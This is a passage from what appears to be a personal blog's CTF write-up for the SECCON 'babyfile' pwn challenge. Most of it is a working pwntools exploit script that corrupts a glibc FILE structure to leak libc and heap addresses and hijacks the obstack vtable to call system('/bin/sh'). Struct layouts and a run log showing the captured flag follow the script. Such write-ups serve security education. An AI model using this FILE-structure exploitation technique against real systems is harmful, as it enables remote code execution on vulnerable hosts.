File._IO_write_base)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x78</span>), File._IO_write_ptr)</span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xa0</span>), File.vtable)</span><br><span class="line">    write_ptr(pwn.p64(<span class="number">1</span>), File.fileno)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    leak = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x2160c0</span> + <span class="number">0x2d160</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br><span class="line">    libc.address = leak</span><br><span class="line"></span><br><span class="line">    leak_main_arena = leak + <span class="number">0x1ed5a0</span></span><br><span class="line"></span><br><span class="line">    heap = leak_ptr(pwn.p64(leak_main_arena)) - <span class="number">0x2a0</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    _IO_obstack_jumps = leak + <span class="number">0x1E9260</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;_IO_obstack_jumps: <span class="subst">&#123;<span class="built_in">hex</span>(_IO_obstack_jumps)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit vtable =&gt; _IO_obstack_jumps</span></span><br><span class="line">    write_ptr(pwn.p64(_IO_obstack_jumps - <span class="number">8</span> * <span class="number">9</span>), File.vtable)</span><br><span class="line">    write_ptr(pwn.p64(heap + <span class="number">0x2a0</span>), File.obstack)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xff</span>), File._IO_read_base)</span><br><span class="line"></span><br><span class="line">    write_ptr(pwn.p64(libc.sym.system), obstack.chunkfun) <span class="comment"># fn ptr, system</span></span><br><span class="line">    write_ptr(pwn.p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))), obstack.extra_arg) <span class="comment"># arg</span></span><br><span class="line">    partial_write(pwn.p8(<span class="literal">True</span>), obstack.use_extra_arg)</span><br><span class="line"></span><br><span class="line">    fflush()</span><br><span class="line">    <span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&quot;cat flag-f81d1f481db83712a1128dc9b72d5503.txt&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">type = struct _IO_FILE &#123;</span></span><br><span class="line"><span class="string">/*      0      |       4 */    int _flags;</span></span><br><span class="line"><span class="string">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="string">/*      8      |       8 */    char *_IO_read_ptr;</span></span><br><span class="line"><span class="string">/*     16      |       8 */    char *_IO_read_end;</span></span><br><span class="line"><span class="string">/*     24      |       8 */    char *_IO_read_base;</span></span><br><span class="line"><span class="string">/*     32      |       8 */    char *_IO_write_base;</span></span><br><span class="line"><span class="string">/*     40      |       8 */    char *_IO_write_ptr;</span></span><br><span class="line"><span class="string">/*     48      |       8 */    char *_IO_write_end;</span></span><br><span class="line"><span class="string">/*     56      |       8 */    char *_IO_buf_base;</span></span><br><span class="line"><span class="string">/*     64      |       8 */    char *_IO_buf_end;</span></span><br><span class="line"><span class="string">/*     72      |       8 */    char *_IO_save_base;</span></span><br><span class="line"><span class="string">/*     80      |       8 */    char *_IO_backup_base;</span></span><br><span class="line"><span class="string">/*     88      |       8 */    char *_IO_save_end;</span></span><br><span class="line"><span class="string">/*     96      |       8 */    struct _IO_marker *_markers;</span></span><br><span class="line"><span class="string">/*    104      |       8 */    struct _IO_FILE *_chain;</span></span><br><span class="line"><span class="string">/*    112      |       4 */    int _fileno;</span></span><br><span class="line"><span class="string">/*    116      |       4 */    int _flags2;</span></span><br><span class="line"><span class="string">/*    120      |       8 */    __off_t _old_offset;</span></span><br><span class="line"><span class="string">/*    128      |       2 */    unsigned short _cur_column;</span></span><br><span class="line"><span class="string">/*    130      |       1 */    signed char _vtable_offset;</span></span><br><span class="line"><span class="string">/*    131      |       1 */    char _shortbuf[1];</span></span><br><span class="line"><span class="string">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="string">/*    136      |       8 */    _IO_lock_t *_lock;</span></span><br><span class="line"><span class="string">/*    144      |       8 */    __off64_t _offset;</span></span><br><span class="line"><span class="string">/*    152      |       8 */    struct _IO_codecvt *_codecvt;</span></span><br><span class="line"><span class="string">/*    160      |       8 */    struct _IO_wide_data *_wide_data;</span></span><br><span class="line"><span class="string">/*    168      |       8 */    struct _IO_FILE *_freeres_list;</span></span><br><span class="line"><span class="string">/*    176      |       8 */    void *_freeres_buf;</span></span><br><span class="line"><span class="string">/*    184      |       8 */    size_t __pad5;</span></span><br><span class="line"><span class="string">/*    192      |       4 */    int _mode;</span></span><br><span class="line"><span class="string">/*    196      |      20 */    char _unused2[20];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                               /* total size (bytes):  216 */</span></span><br><span class="line"><span class="string">                             &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct obstack          /* control current object in current chunk */</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  long chunk_size;              /* preferred size to allocate chunks in */</span></span><br><span class="line"><span class="string">  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */</span></span><br><span class="line"><span class="string">  char *object_base;            /* address of object we are building */</span></span><br><span class="line"><span class="string">  char *next_free;              /* where to add next char to current object */</span></span><br><span class="line"><span class="string">  char *chunk_limit;            /* address of char after current chunk */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    PTR_INT_TYPE tempint;</span></span><br><span class="line"><span class="string">    void *tempptr;</span></span><br><span class="line"><span class="string">  &#125; temp;                       /* Temporary for some macros.  */</span></span><br><span class="line"><span class="string">  int alignment_mask;           /* Mask of alignment for each object. */</span></span><br><span class="line"><span class="string">  /* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="string">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="string">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line"><span class="string">  struct _obstack_chunk *(*chunkfun) (void *, long);</span></span><br><span class="line"><span class="string">  void (*freefun) (void *, struct _obstack_chunk *);</span></span><br><span class="line"><span class="string">  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line"><span class="string">  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line"><span class="string">  unsigned maybe_empty_object : 1; /* There is a possibility that the current</span></span><br><span class="line"><span class="string">				      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="string">				      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="string">				      a bigger chunk to replace it. */</span></span><br><span class="line"><span class="string">  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed</span></span><br><span class="line"><span class="string">				     handler on error, but retained for binary</span></span><br><span class="line"><span class="string">				     compatibility.  */</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157</span></span><br><span class="line"><span class="string">[*] &#x27;/home/nasm/Documents/pwn/seccon/babyfile/chall&#x27;</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Full RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      PIE enabled</span></span><br><span class="line"><span class="string">[*] &#x27;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#x27;</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Partial RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      PIE enabled</span></span><br><span class="line"><span class="string">[+] Opening connection to babyfile.seccon.games on port 3157: Done</span></span><br><span class="line"><span class="string">[*] libc: 0x7fe2bc538000</span></span><br><span class="line"><span class="string">[*] heap: 0x55fd27776000</span></span><br><span class="line"><span class="string">[*] _IO_obstack_jumps: 0x7fe2bc721260</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">SECCON&#123;r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3&#125;</span></span><br><span class="line"><span class="string">[*] Got EOF while reading in interactive</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/posts/filestream/"
      title="Linux file stream internals for fun and profit"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Linux file stream internals for fun and profit
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/posts/zigzag/"
      title="[corCTF 2022 - pwn] zigzag"
     >

    <p class="title-text">
      
        [corCTF 2022 - pwn] zigzag
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 nasm<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
